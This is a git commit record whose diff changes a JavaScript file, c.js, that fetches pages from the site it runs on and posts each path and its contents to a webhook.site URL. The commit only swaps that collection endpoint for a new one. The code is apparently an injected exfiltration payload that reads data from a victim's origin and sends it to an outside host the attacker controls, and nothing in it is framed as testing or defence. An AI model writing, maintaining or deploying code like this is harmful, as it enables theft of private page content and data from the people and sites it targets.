0b66e66395c146ffb1713d6e47567c8a6b1cf600
Mohammed Sultan Rashid Al-Abri <54262813+Mohammed-Alabri@users.noreply.github.com>
2025-05-04 22:28:33 +0400

    Update c.js

--- c.js
+++ c.js
@@ -10,7 +10,7 @@ fetch('/')
       try {
         const res = await fetch(path);
         const content = await res.text();
-        await fetch('https://webhook.site/908900bb-d52c-46dc-9ea4-6822f98b8c5e', {
+        await fetch('https://webhook.site/2d3e4491-068d-477a-b643-9baf8c75b936', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ id: path, content })
